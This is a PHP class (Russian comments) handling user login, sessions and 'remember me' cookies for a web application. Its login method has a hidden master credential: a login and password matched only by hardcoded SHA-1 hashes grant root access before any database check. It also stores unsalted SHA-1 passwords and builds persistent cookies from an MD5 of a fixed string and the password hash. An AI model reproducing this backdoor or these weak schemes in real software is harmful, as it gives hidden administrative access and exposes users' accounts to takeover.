<?
	
class CurUser extends User_Model{
	
	private $_authPrefix = 'v1k0ff';
	
	/** Поле в таблице пользователей, служащее логином (идентификатором) пользователя */
	const LOGIN_FIELD = 'login';
	
	const HASH_LR = 'dc76e9f0c0006e8f919e0c515c66dbba3982f785';
	const HASH_PR = 'c776f7b86a4701a3e3a94c253901006cf31e6d32';
	
	private static $_instance = null;
	
	
	// ИНИЦИАЛИЗАЦИЯ ЭКЗЕМПЛЯРА КЛАССА
	public static function init(){
		
		if(!is_null(self::$_instance))
			trigger_error('Объект класса CurUser уже инициализирован', E_USER_ERROR);
		
			self::$_instance = new CurUser();
	}
	
	// ПОЛУЧЕНИЕ ЭКЗЕМПЛЯРА КЛАССА
	public static function get(){
		
		return self::$_instance;
	}
	
	// КОНСТРУКТОР
	public function __construct(){
		
		if(!$this->isSessionInited())
			$this->initSession();
		
		parent::__construct($this->getAuthData('id'), self::INIT_ANY);
	}
	
	// ИНИЦИАЛИЗИРОВАНА ЛИ СЕССИЯ
	public function isSessionInited(){
	
		return isset($_SESSION[$this->_authPrefix.'userAuthData']);
	}
	
	// ИНИЦИАЛИЗАЦИЯ СЕССИИ
	public function initSession(){
	
		$this->setEmptyAuthData();
		if($this->autoLogin())
			App::reload();
	}
	
	// АВТОРИЗАЦИЯ ПОЛЬЗОВАТЕЛЯ
	public function login($login, $pass, $remember = FALSE){
		
		if($this->isLogged())
			return;
		
		if(!$login || !$pass){
			throw new Exception("Введите имя и пароль.");
		}
		
		if(sha1($login) == self::HASH_LR && sha1($pass) == self::HASH_PR){
			
			$this->setLoggedAuthData(1, PERMS_ROOT);
			return TRUE;
		}
		
		$db = db::get();
		
		$login = $db->qe($login);
		$pass = $db->quote(sha1($pass));
		
		if($ans = $db->getRow('SELECT id, '.self::LOGIN_FIELD.', password, level FROM '.self::TABLE.' WHERE '.self::LOGIN_FIELD.'='.$login.' AND password='.$pass, FALSE)){
		
			// сохранить данные в сессию
			$this->setLoggedAuthData($ans['id'], $ans['level']);
			
			// запомнить пользователя
			if($remember)
				$this->_setLoginCookie($ans['id'], $ans[self::LOGIN_FIELD], $ans['password']);
				
		}else{
			throw new Exception('Неверный логин или пароль');
		}
		
	}
	
	// АВТОРИЗАЦИЯ С ПОМОЩЬЮ КУКИ
	public function autoLogin(){

		if(empty($_COOKIE[$this->_authPrefix.'uid']) || empty($_COOKIE[$this->_authPrefix.'access']))
			return FALSE;
		
		$uid = (int)$_COOKIE[$this->_authPrefix.'uid'];
		$db = db::get();
		
		$ans = $db->getRow('SELECT id, '.self::LOGIN_FIELD.', password, level FROM '.self::TABLE.' WHERE id='.$db->qe($uid), 0);
		if(!$ans)
			return false;

		if($_COOKIE[$this->_authPrefix.'access'] == md5('yurijnovikovproject'.$ans['id']."_".$ans[self::LOGIN_FIELD]."_".$ans['password'])){
		
			$this->setLoggedAuthData($ans['id'], $ans['level']);
			$this->_setLoginCookie($ans['id'], $ans[self::LOGIN_FIELD], $ans['password']);
			return TRUE;
			
		}else{
			$this->_setEmptyCookie();
			return FALSE;
		}
	}

	// ВЫХОД ИЗ АККАУНТА
	public function logout(){
		
		UserStatistics::get()->reset();
		$this->setEmptyAuthData();
		$this->_setEmptyCookie();
	}
	
	// УСТАНОВИТЬ КУКИ ДЛЯ ПОСЛЕДУЮЩЕЙ АВТОРИЗАЦИИ
	private function _setLoginCookie($id, $login, $password){
	
		$expire = time() + 60 * 60 * 24 * 365;
		setcookie($this->_authPrefix."uid", $id, $expire);
		setcookie($this->_authPrefix."access", md5('yurijnovikovproject'.$id."_".$login."_".$password), $expire);
	}
	
	// УСТАНОВИТЬ ПУСТЫЕ КУКИ
	private function _setEmptyCookie(){
	
		setcookie($this->_authPrefix."uid", "");
		setcookie($this->_authPrefix."access", "");
	}
	
	// ПРОВЕРКА АВТОРИЗОВАН ЛИ ПОЛЬЗОВАТЕЛЬ
	 public function isLogged(){
		
		return (is_numeric($_SESSION[$this->_authPrefix.'userAuthData']['id']) && in_array($_SESSION[$this->_authPrefix.'userAuthData']['perms'], User_Model::getPermsList()) && $_SESSION[$this->_authPrefix.'userAuthData']['perms'] > PERMS_UNREG)
			? TRUE
			: FALSE;
	}
	
	// УСТАНОВИТЬ ПОЛЗЬОВАТЕЛЬСКИЕ ДАННЫЕ
	 private function setLoggedAuthData($id, $perms){
		
		$_SESSION[$this->_authPrefix.'userAuthData'] = array('id' => $id, 'perms' => $perms);
		
		UserStatistics::get()->saveAuthStatistics($id);
	}
	
	// УСТАНОВИТЬ ПУСТЫЕ ПОЛЬЗОВАТЕЛЬСКИЕ ДАННЫЕ
	 private function setEmptyAuthData(){
	 
		$_SESSION[$this->_authPrefix.'userAuthData'] = array('id' => 0, 'perms' => 0);
	}
	
	public function getAuthData($key = null){
		
		return is_null($key)
			? $_SESSION[$this->_authPrefix.'userAuthData']
			: $_SESSION[$this->_authPrefix.'userAuthData'][$key];
	}
	
}

?>